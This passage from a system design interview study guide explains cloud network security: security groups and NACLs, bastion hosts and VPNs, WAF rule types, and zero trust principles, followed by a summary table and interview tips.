- **Reference security groups** — use SG references instead of IP ranges (e.g., "allow from sg-web-servers" instead of "allow from 10.0.3.0/24")
- **No 0.0.0.0/0 for SSH** — restrict SSH to bastion host or VPN only
- **Separate SGs per tier** — web, app, database each have their own security group
- **Deny by default** — security groups deny all traffic unless explicitly allowed

**Network ACLs (NACLs):**
Stateless firewall at the **subnet** level (vs security groups at the instance level).

| Feature | Security Group | Network ACL |
|---------|---------------|-------------|
| Level | Instance | Subnet |
| Stateful | Yes (return traffic auto-allowed) | No (must explicitly allow return traffic) |
| Rules | Allow only | Allow and Deny |
| Evaluation | All rules evaluated | Rules evaluated in order (first match wins) |
| Use case | Primary firewall | Additional layer of defense |

---

### VPN and Bastion Host

**Bastion Host (Jump Box):**
A hardened server in a public subnet that serves as the **only entry point** for SSH/RDP access to private resources.

```
Developer → SSH → Bastion Host (public subnet) → SSH → App Server (private subnet)
                                                 → SSH → Database Server (private subnet)

The bastion host is the ONLY server with SSH open to the internet.
All other servers only accept SSH from the bastion's security group.
```

**VPN (Virtual Private Network):**
Creates an encrypted tunnel between your network and the VPC, allowing direct access to private resources without a bastion host.

```
Developer → VPN Client → Encrypted Tunnel → VPC → Private Subnet → App Server
                                                                   → Database

With VPN, developers can access private resources as if they were on the same network.
No bastion host needed (but VPN infrastructure must be managed).
```

| Feature | Bastion Host | VPN |
|---------|-------------|-----|
| Setup | Simple (one EC2 instance) | More complex (VPN server/service) |
| Access | SSH/RDP only | Full network access |
| Security | Good (single entry point) | Good (encrypted tunnel) |
| User experience | Must SSH hop through bastion | Direct access (feels like local network) |
| Cost | Low (one small instance) | Moderate (VPN service/instance) |
| Best for | Small teams, occasional access | Larger teams, frequent access |

**Cloud VPN Options:**
- **AWS Client VPN** — managed VPN endpoint for remote access
- **AWS Site-to-Site VPN** — connect on-premises network to VPC
- **GCP Cloud VPN** — IPsec VPN tunnels
- **Tailscale / WireGuard** — modern, lightweight VPN solutions

---

### WAF (Web Application Firewall)

A **WAF** inspects HTTP/HTTPS traffic and blocks malicious requests based on rules.

```
Internet → WAF → Load Balancer → Application

WAF inspects:
  - Request URL, headers, body
  - Blocks SQL injection patterns
  - Blocks XSS patterns
  - Blocks known bad IPs/bots
  - Rate limits by IP/path
  - Geo-blocks (block traffic from specific countries)
```

**WAF Rule Types:**

| Rule Type | Description | Example |
|-----------|-------------|---------|
| **Managed rules** | Pre-built rules from the provider | AWS Managed Rules, OWASP Core Rule Set |
| **Custom rules** | Rules you define | Block requests with "DROP TABLE" in the body |
| **Rate-based rules** | Block IPs exceeding a request rate | Block IP if > 2000 requests in 5 minutes |
| **IP reputation** | Block known malicious IPs | AWS IP reputation list, Cloudflare threat intelligence |
| **Geo-blocking** | Block traffic from specific countries | Block all traffic from countries where you don't operate |
| **Bot detection** | Identify and block automated traffic | CAPTCHA challenge for suspected bots |

**WAF Providers:**
- **AWS WAF** — integrates with ALB, CloudFront, API Gateway
- **Cloudflare WAF** — edge-based, easy setup
- **Akamai Kona** — enterprise WAF
- **ModSecurity** — open-source WAF (with Nginx/Apache)

---

### Zero Trust Architecture

**Zero Trust** is a security model that assumes **no implicit trust** — every request must be authenticated and authorized, regardless of where it comes from (even inside the network).

```
Traditional (Castle-and-Moat):
  Outside the firewall → untrusted → must authenticate
  Inside the firewall → trusted → free access to everything
  Problem: if an attacker gets inside, they have access to everything!

Zero Trust:
  Every request → must authenticate + authorize → regardless of network location
  Inside the network ≠ trusted
  Every service verifies every request
```

**Zero Trust Principles:**

| Principle | Description | Implementation |
|-----------|-------------|---------------|
| **Verify explicitly** | Always authenticate and authorize based on all available data | mTLS between services, JWT validation on every request |
| **Least privilege** | Grant minimum access needed for the task | RBAC/ABAC, short-lived credentials, just-in-time access |
| **Assume breach** | Design as if the attacker is already inside | Micro-segmentation, encrypt all traffic (even internal), monitor everything |

**Zero Trust Implementation:**

| Layer | Traditional | Zero Trust |
|-------|-----------|-----------|
| **Network** | Flat internal network, firewall at perimeter | Micro-segmented; each service has its own security group |
| **Service communication** | Plain HTTP internally | mTLS everywhere (service mesh — Istio, Linkerd) |
| **Authentication** | Perimeter only (VPN/firewall) | Every service authenticates every request (JWT, mTLS) |
| **Authorization** | Network-based (if you can reach it, you can use it) | Policy-based (OPA, Cedar) — checked on every request |
| **Secrets** | Long-lived credentials | Short-lived, auto-rotated (Vault dynamic secrets) |
| **Monitoring** | Perimeter logs | Full observability — every request logged and traced |

**Key Point for System Design:** In interviews, mentioning zero trust (mTLS between services, JWT validation on every request, micro-segmentation) shows security maturity. It's especially relevant for microservices architectures.

---

## Summary & Key Takeaways

| Topic | Key Point |
|-------|-----------|
| Password Storage | Never plaintext; use bcrypt or Argon2 (slow, salted hashes) |
| MFA | TOTP (authenticator app) or FIDO2 (hardware key) — avoid SMS |
| OAuth 2.0 | Authorization framework; Authorization Code + PKCE for modern apps |
| OIDC | Authentication layer on OAuth 2.0; provides ID tokens (JWT) with user identity |
| JWT | Header.Payload.Signature; stateless; verify with public key; short-lived + refresh token |
| Session vs Token | Sessions for traditional web (easy revocation); JWT for APIs/mobile (stateless) |
| RBAC | Roles → permissions → users; simple, good for most apps |
| ABAC | Attribute-based policies; flexible but complex; for compliance-heavy systems |
| Zanzibar | Relationship-based access control; Google-scale; SpiceDB is open-source |
| Symmetric Encryption | AES-256-GCM; same key for encrypt/decrypt; fast; for data encryption |
| Asymmetric Encryption | RSA/ECC; public key encrypts, private key decrypts; for key exchange, signatures |
| Hashing | One-way; SHA-256 for integrity; bcrypt/Argon2 for passwords; never reversible |
| Encryption at Rest | TDE, S3 SSE, EBS encryption — protect stored data |
| Encryption in Transit | TLS/HTTPS for client-server; mTLS for service-to-service |
| SQL Injection | Use parameterized queries — NEVER concatenate user input into SQL |
| XSS | Escape HTML output; use CSP headers; HttpOnly cookies |
| CSRF | CSRF tokens; SameSite cookies |
| DDoS | CDN absorption, rate limiting, auto-scaling, WAF |
| Secrets Management | Vault, AWS Secrets Manager; never hardcode; rotate regularly |
| VPC | Public subnets (LB, NAT) + private subnets (app, DB); least privilege |
| Security Groups | Instance-level firewall; allow only required ports and sources |
| WAF | Inspects HTTP traffic; blocks SQL injection, XSS, bots, geo-blocks |
| Zero Trust | No implicit trust; mTLS everywhere; verify every request; assume breach |

---

## Interview Tips for Module 29

1. **Authentication flow** — draw the OAuth 2.0 Authorization Code flow; explain each step
2. **JWT** — explain the structure (header.payload.signature); explain verification; mention short-lived + refresh token pattern
3. **Session vs JWT** — know the trade-offs; recommend the hybrid approach (short JWT + server-side refresh token)
4. **Password storage** — explain why bcrypt/Argon2 (slow hashing); never SHA-256 for passwords
5. **RBAC vs ABAC** — explain both with examples; RBAC for most apps, ABAC for complex rules
6. **Encryption** — explain symmetric (AES for data) vs asymmetric (RSA for key exchange); explain TLS handshake
7. **Encryption at rest + in transit** — mention both in every system design; they protect against different threats
8. **SQL injection** — explain the attack and the fix (parameterized queries); this is a must-mention
9. **CSRF** — explain the attack and SameSite cookies as the modern defense
10. **VPC architecture** — draw public + private subnets; explain why databases go in private subnets
11. **Security groups** — explain least privilege; reference SGs instead of IP ranges
12. **Zero trust** — mention mTLS between services, JWT on every request, micro-segmentation; shows security maturity
